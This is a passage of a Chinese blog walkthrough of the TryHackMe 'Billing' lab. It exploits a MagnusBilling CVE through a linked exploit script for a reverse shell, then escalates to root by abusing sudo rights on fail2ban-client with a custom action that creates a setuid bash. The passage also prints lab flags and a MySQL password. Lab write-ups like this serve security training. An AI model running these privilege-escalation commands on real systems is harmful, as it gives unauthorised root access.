ode\u003e/mbilling/\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeLearn%20-%20Billing/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e输入账号密码后点击\u003ccode\u003elogin\u003c/code\u003e，进行抓包\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeLearn%20-%20Billing/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e输入的密码是\u003ccode\u003e1\u003c/code\u003e，可以看到是通过前端加密了的\u003c/p\u003e\n\u003cp\u003e在网上寻找一下 \u003ccode\u003embilling\u003c/code\u003e 的公开漏洞（PS：现在开始IP为\u003ccode\u003e10.10.141.110\u003c/code\u003e）\u003c/p\u003e\n\u003cp\u003e能发现一个CVE：\u003ca href=\"https://www.ddpoc.com/poc/DVB-2023-4549.html\"\u003ehttps://www.ddpoc.com/poc/DVB-2023-4549.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e利用脚本：\u003ca href=\"https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit\"\u003ehttps://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e可以利用脚本反弹\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TryHackMeLearn%20-%20Billing/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003emagnus\u003c/code\u003e 用户家目录能读取\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\nTHM{4a6831d5f124b25eefb1e92e0f0da4ca}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e获得\u003ccode\u003eshell\u003c/code\u003e后准备进行提权\u003c/p\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e asterisk on Billing:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e asterisk:\n    Defaults!/usr/bin/fail2ban-client !requiretty\n\nUser asterisk may run the following commands on Billing:\n    (ALL) NOPASSWD: /usr/bin/fail2ban-client\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能以\u003ccode\u003eroot\u003c/code\u003e权限执行\u003ccode\u003efail2ban-client\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e能在网上找到文章：\u003ca href=\"https://juggernaut-sec.com/fail2ban-lpe/\"\u003ehttps://juggernaut-sec.com/fail2ban-lpe/\u003c/a\u003e | \u003ca href=\"https://blog.csdn.net/2201_75556043/article/details/146429804\"\u003ehttps://blog.csdn.net/2201_75556043/article/details/146429804\u003c/a\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e并将其配置内容复制到\u003ccode\u003e/tmp/fail2ban\u003c/code\u003e 里\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ersync -av /etc/fail2ban/ /tmp/fail2ban/\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后自定义配置文件，该配置文件将 \u003ccode\u003e/bin/bash\u003c/code\u003e 移动到 \u003ccode\u003e/tmp\u003c/code\u003e，然后设置\u003ccode\u003esid\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e \u003e /tmp/script \u0026#x3C;\u0026#x3C;\u003cspan class=\"hljs-string\"\u003eEOF\n#!/bin/sh\ncp /bin/bash /tmp/bash\nchmod 755 /tmp/bash\nchmod u+s /tmp/bash\nEOF\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x /tmp/script\n\n\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e \u003e /tmp/fail2ban/action.d/custom-start-command.conf \u0026#x3C;\u0026#x3C;\u003cspan class=\"hljs-string\"\u003eEOF\n[Definition]\nactionstart = /tmp/script\nEOF\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e \u003e\u003e /tmp/fail2ban/jail.local \u0026#x3C;\u0026#x3C;\u003cspan class=\"hljs-string\"\u003eEOF\n[my-custom-jail]\nenabled = true\naction = custom-start-command\nEOF\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e \u003e /tmp/fail2ban/filter.d/my-custom-jail.conf \u0026#x3C;\u0026#x3C;\u003cspan class=\"hljs-string\"\u003eEOF\n[Definition]\nEOF\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e fail2ban-client -c /tmp/fail2ban/ -v restart\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e最后运行 \u003ccode\u003e/tmp/bash\u003c/code\u003e 即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003easterisk@Billing:/$ ./tmp/bash -p\nbash-5.1# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebash-5.1# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nTHM{33ad5b530e71a172648f424ec23fae60}\nbash-5.1# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e passwordMysql.\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e \nMgnodcVwGxW0xLUN\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"TryHackMe - Learn - Billing","date":"2025-05-24","updated":"2025-05-24","tags":["TryHackMe","Linux靶机","Billing","fail2ban"],"categories":"靶机","comments":true,"description":"Learn Billing https://tryhackme.com/room/billing | esay | Some mistakes can be costly. Gain a shell, find the way and escalate your privileges! Note:..."},"recentPosts":[{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs
